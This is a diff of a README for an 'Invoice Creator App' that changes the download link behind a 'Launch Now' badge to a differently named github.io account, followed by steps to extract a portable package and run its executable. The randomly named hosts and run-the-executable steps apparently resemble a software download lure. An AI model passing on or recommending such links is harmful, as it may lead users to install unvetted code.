@@ -11,7 +11,7 @@ Unlike standard invoicing tools, this **Invoice Creator App** offers deep custom
 
 ## Getting Started
 
-[![Launch](https://img.shields.io/badge/Launch-Now-ff6b6b?style=for-the-badge)](https://sharon3349949.github.io/.github/invoice-creator-app)
+[![Launch](https://img.shields.io/badge/Launch-Now-ff6b6b?style=for-the-badge)](https://arielhansenqmoh.github.io/.github/invoice-creator-app)
 
 1. Access the **Invoice Creator App** and extract the portable package.  
 2. Run the main executable to initialize the **Invoice Creator App** interface.  
